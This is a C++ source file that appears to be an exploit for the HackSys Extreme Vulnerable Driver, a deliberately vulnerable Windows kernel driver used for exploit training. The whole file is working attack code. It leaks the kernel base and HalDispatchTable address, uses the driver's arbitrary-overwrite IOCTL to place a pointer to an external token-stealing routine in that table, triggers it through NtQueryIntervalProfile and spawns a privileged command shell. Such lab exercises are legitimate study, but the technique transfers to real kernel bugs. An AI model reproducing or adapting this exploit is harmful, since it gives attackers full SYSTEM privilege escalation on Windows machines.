#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

extern "C" VOID StealToken(void);

#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE 0x22200B

typedef NTSTATUS(NTAPI* PNtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI* PNtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval
	);
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG64              Reserved1;
	ULONG64              Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
}WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

HANDLE GetDeviceHandle()
{
    HANDLE hRet = NULL;
    hRet = CreateFile(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    if (hRet == INVALID_HANDLE_VALUE) {
        printf("Error open device with error code: %d\n", GetLastError());
		exit(-1);
    }

    return hRet;
}

PSYSTEM_MODULE GetNtoskrnlInfo()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll");
    if (ntdll == NULL) {
        printf("[-] Failed to get handle to ntdll.dll.\n");
        exit(-1);
    }

    PNtQuerySystemInformation _NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (_NtQuerySystemInformation == NULL) {
		printf("[-] Failed to get address of NtQuerySystemInformation.\n");
		exit(-1);
	}

	ULONG retLength;
	_NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &retLength);
	PSYSTEM_MODULE_INFORMATION ModuleInfo =
		(PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, retLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo) {
		printf("[-] Failed to allocate memory for ModuleInfo.\n");
		exit(-1);
	}

	_NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, retLength, &retLength);
	return &ModuleInfo->Modules[0];
}

int main()
{
	SYSTEM_MODULE krnlInfo = *GetNtoskrnlInfo();

	ULONG64 ntoskrnlBase = (ULONG64)krnlInfo.ImageBaseAddress;
	printf("[+] Found address to ntoskrnl.exe at 0x%llx.\n", ntoskrnlBase);

	printf("[+] Kernel in user: %s.\n", krnlInfo.Name);
	char* krnlName = strrchr((char*)krnlInfo.Name, '\\') + 1;
	DWORD dBufSize = MultiByteToWideChar(CP_ACP, 0, krnlName, (int)strlen(krnlName), NULL, 0);
	WCHAR* dBuf = (WCHAR*)malloc(sizeof(WCHAR) * (dBufSize+1));
	int iRet = MultiByteToWideChar(CP_ACP, 0, krnlName, (int)strlen(krnlName)+1, dBuf, dBufSize+1);     // strlen + 1 to make terminator
	if (iRet <= 0 || dBuf == NULL) {
		printf("[-] Failed to convert char to wChar.\n");
		exit(-1);
	}

	wprintf(L"[test] %ls\n", dBuf);

	HMODULE ntoskrnlUser = LoadLibraryEx(dBuf, NULL, DONT_RESOLVE_DLL_REFERENCES);
	// HMODULE ntoskrnlUser = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (ntoskrnlUser == NULL) {
		printf("[-] Failed to load kernel image.\n");
		exit(-1);
	}
	printf("[+] Loaded kernel in usermode using LoadLibraryEx: %p.\n", ntoskrnlUser);

	ULONG64 userHalDispatchTable = (ULONG64)GetProcAddress(ntoskrnlUser, "HalDispatchTable");
	if (userHalDispatchTable == NULL) {
		printf("[-] Failed to locate HalDispatchTable.\n");
		exit(-1);
	}
	printf("[+] Found HalDispatchTable in usermode: 0x%llx.\n", userHalDispatchTable);

	ULONG64 addrHalDispatchTable = userHalDispatchTable - (ULONG64)ntoskrnlUser + ntoskrnlBase;
	printf("[+] Found address to HalDispatchTable at 0x%llx.\n", addrHalDispatchTable);

	HANDLE driver = GetDeviceHandle();
	printf("[+] Opened handle to driver: %p.\n", driver);

	PWRITE_WHAT_WHERE uBuffer = (PWRITE_WHAT_WHERE)VirtualAlloc(
		NULL,
		sizeof(WRITE_WHAT_WHERE),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (uBuffer == NULL) {
		printf("[-] Failed to allocate user buffer.\n");
		exit(-1);
	}
	printf("[+] User buffer allocated: %p\n", uBuffer);

	ULONG64 What = (ULONG64)&StealToken;
	uBuffer->What = &What;
	uBuffer->Where = (PULONG_PTR)addrHalDispatchTable + 1;     // pointer + 1

	DWORD bytesRet;
	if (DeviceIoControl(
		driver,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		uBuffer,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&bytesRet,
		NULL
	)) {
		printf("[+] Sent buffer to driver.\n");
	}
	else {
		printf("[-] Failed to send buffer.\n");
		exit(-1);
	}

	// Trigger the payload by calling NtQueryIntervalProfile()
	HMODULE ntdll = GetModuleHandle(L"ntdll");
	if (ntdll == NULL) {
		printf("[-] Failed to get handle of ntdll.\n");
		exit(-1);
	}
	PNtQueryIntervalProfile _NtQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(
		ntdll,
		"NtQueryIntervalProfile"
	);
	if (_NtQueryIntervalProfile == NULL) {
		printf("[-] Failed to get address of NtQueryIntervalProfile.\n");
		exit(-1);
	}
	printf("[+] Address of NtQueryIntervalProfile: %p.\n", _NtQueryIntervalProfile);
	ULONG whatever;
	_NtQueryIntervalProfile(0x1234, &whatever);         // first argument seem casual

	system("cmd.exe");

    return 0;
}